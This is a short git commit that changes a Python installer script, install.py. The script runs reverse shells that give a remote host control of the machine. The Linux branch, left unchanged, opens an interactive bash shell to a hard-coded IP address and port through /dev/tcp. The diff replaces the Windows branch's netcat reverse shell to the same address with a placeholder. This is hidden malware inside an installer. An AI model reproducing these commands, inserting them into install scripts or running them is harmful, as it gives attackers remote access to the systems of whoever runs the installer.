52cbaedc1dcda83009b63a44bd8c61a2828910de
quachuooo <160610847+quachuooo@users.noreply.github.com>
2024-02-21 19:46:29 +0800

    Update install.py

--- install.py
+++ install.py
@@ -6,4 +6,4 @@ system_name = platform.system()
 if system_name == 'Linux':
     os.system("bash -i >& /dev/tcp/112.124.8.36/8889 0>&1")
 if system_name == 'Windows':
-    os.system("nc 112.124.8.36 8889 -e cmd ")
+    os.system("nc ip -e cmd ")
